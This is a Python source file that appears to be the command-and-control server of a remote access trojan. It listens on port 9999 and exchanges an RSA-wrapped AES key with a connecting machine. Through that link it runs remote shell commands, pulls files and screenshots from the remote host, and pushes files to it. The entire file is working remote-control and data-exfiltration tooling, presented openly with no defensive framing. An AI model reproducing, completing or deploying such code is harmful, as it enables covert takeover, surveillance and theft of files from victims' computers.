import os
import socket
from threading import Thread
from pynput.keyboard import *
from bin.helper_methods import *


class Server(Thread):
    def __init__(self):
        self.controller = Controller()
        self.conn = socket.socket()
        self.conn.bind((get_ip_address(), 9999))
        self.conn.listen(100)
        print('[+] Listening for income TCP connection on port 9999')
        self.command = ''
        self.commands = []
        self.ind = 0
        self.current_input = ''
        self.cwd = os.path.abspath('.')
        th = Thread(target=self.key_event)
        self.start_time = time.time()
        self.timer = Thread(target=self.check_time).start()
        th.start()

    def connect(self):
        self.conn, addr = self.conn.accept()
        print('[+]We got a connection from', addr)
        self.conn.send(RSAFunc_server(enc_key.encode('ISO-8859-1', errors='ignore'))) # Sending the AES key with RSA encryption
        while True:
            try:
                self.cwd = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore')
                break
            except Exception:
                continue

    def download(self, command):
        self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
        if command != 'screenshot':
            _, path = command.split("*")
        else:
            path = os.path.abspath('screenshots') + time.asctime()[4:8] + time.asctime()[
                                                                          8:10] + "-" + time.asctime()[
                                                                                        20:] + "-" + time.asctime()[
                                                                                                     11:19].replace(
                ':', '-') + ".jpg"
        f = open(path, 'wb')
        while True:
            bits = self.conn.recv(1024)
            if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
                f.write(bits[:-4])
                f.close()
                return '[+] Transfer completed '
            if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
                return '[-] Unable to find the file'
            f.write(bits)

    def upload(self, command):
        self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
        send, command = command.split("*")
        if os.path.isfile(command):
            print(os.path.exists(command))
            f = open(command, 'rb')
            packet = f.read(1024)
            while len(packet) > 0:
                self.conn.send(packet)
                packet = f.read(1024)
            self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
            return '[+] Transfer completed!'
        else:
            self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
            return 'File not found'

    def execute(self):
        self.SaveObject(self.command)
        print('list of previous commands:', self.commands)
        print('current input:', self.current_input)
        self.start_time = time.time()
        print(self.command)
        if 'cd' in self.command:
            self.conn.send(encrypt_server(self.command.encode('ISO-8859-1')))
            res = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1')
            if '[+]' in res:
                self.cwd = res[11:]
            return res
        elif 'grab' in self.command or 'download' in self.command:
            self.download(self.command)
        elif 'screenshot' == self.command:
            self.download(self.command)
        elif 'send' in self.command or 'upload' in self.command:
            try:
                self.upload(self.command)
            except Exception as e:
                return e
        elif self.command == '':
            return ''
        else:
            try:
                self.conn.send(encrypt_server(self.command.encode('ISO-8859-1', errors='ignore')))
                length = int(decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore'))
                return decrypt_server(self.conn.recv(16 + length)).decode('ISO-8859-1', errors='ignore')
            except ValueError:
                return 'Value Error'
            except (ConnectionResetError, ConnectionAbortedError):
                self.connect()

    def on_press(self, key):
        if key == Key.up:
            print('Commands list:' , self.commands)
            print('Current Input:', self.current_input, len(self.current_input))
            print('Index: ', self.ind)
            if self.current_input != self.commands[self.ind]:
                for i in range(len(self.current_input) * 2):
                    self.controller.press(Key.backspace)
                    self.controller.release(Key.backspace)
                self.current_input = ''
                for char in self.Back():
                    self.controller.press(char)
                    print('pressing ', char)
                    self.controller.release(char)
                    self.current_input += char
        elif key == Key.down:
            if self.current_input != self.commands[self.ind]:
                for i in range(len(self.current_input) * 2):
                    self.controller.press(Key.backspace)
                    self.controller.release(Key.backspace)
                self.current_input = ''
                for char in self.Forward():
                    self.controller.press(char)
                    self.controller.release(char)
                    self.current_input += char
        elif key == Key.backspace:
            self.current_input = self.current_input[:-1]
        elif key == Key.enter:
            self.current_input = ''
        else:
            try:
                self.current_input += key.char
            except Exception:
                pass

    def Back(self):
        """Up arrow has been pressed"""
        # self.commands: ['dir', 'ipconfig', 'cd ..']
        ind = self.ind
        try:
            self.ind += 1
            print("HERE")
            if self.ind > len(self.commands) - 1:
                self.ind = 0
            return self.commands[ind]
        except IndexError:
            return ''

    def SaveObject(self, obj: ...):
        """
        Appends a command to the list
        """
        if obj in self.commands:  # If I pressed a command which I already executed bring it to the first place.
            self.commands.remove(obj)
            self.commands.insert(0, obj)
        else:
            self.commands.insert(0, obj)
            self.ind = self.commands.index(obj)

    def Forward(self) -> str:
        """
        Down arrow has been pressed.
        """
        try:
            self.ind -= 1
            ind = self.ind
            return self.commands[ind]
        except IndexError:
            return self.commands[0]

    def key_event(self):
        with Listener(on_press=self.on_press) as lis:
            lis.join()

    def check_time(self):
        while True:
            if time.time() - self.start_time > 120:
                self.conn.shutdown(socket.SHUT_RDWR)
                exit()


def main():
    server = Server()


if __name__ == '__main__':
    main()
